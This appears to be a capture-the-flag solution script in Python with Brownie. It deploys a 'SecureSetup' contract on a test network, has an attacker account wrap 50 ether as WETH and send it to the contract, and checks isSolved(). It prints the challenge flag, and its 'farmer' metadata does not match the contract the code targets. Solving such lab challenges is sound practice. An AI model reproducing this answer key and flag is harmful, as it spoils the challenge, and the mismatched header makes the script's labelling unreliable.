from brownie import Contract, interface, SecureSetup
from web3 import Web3
import time, sys
from scripts.helpful_scripts import get_accounts

"""
name: farmer
author: gakonst
flag: PCTF{PR0T3CT_Y0UR_H4RV3ST}
tags: ["pwn"]
description: |
    COMPounding rewards are fun
"""


def deploy():
    global deployer, attacker, secure_contract, weth
    [deployer, attacker] = get_accounts(2)

    # 开始部署
    secure_contract = SecureSetup.deploy(
        {"from": deployer, "value": Web3.toWei(50, "ether")}
    )
    weth = interface.IWETH9(secure_contract.WETH())


def attack():
    weth.deposit({"from": attacker, "value": Web3.toWei(50, "ether")}).wait(1)
    weth.transfer(secure_contract, Web3.toWei(50, "ether"), {"from": attacker}).wait(1)
    return


def check():
    # 检测攻击是否完成： 不能继续借贷
    print("running func check..")
    try:
        assert secure_contract.isSolved()
        print("success!")
    except:
        time.sleep(1)
        print("Not pass yet ;(")

    return


def main():
    deploy()
    attack()
    check()
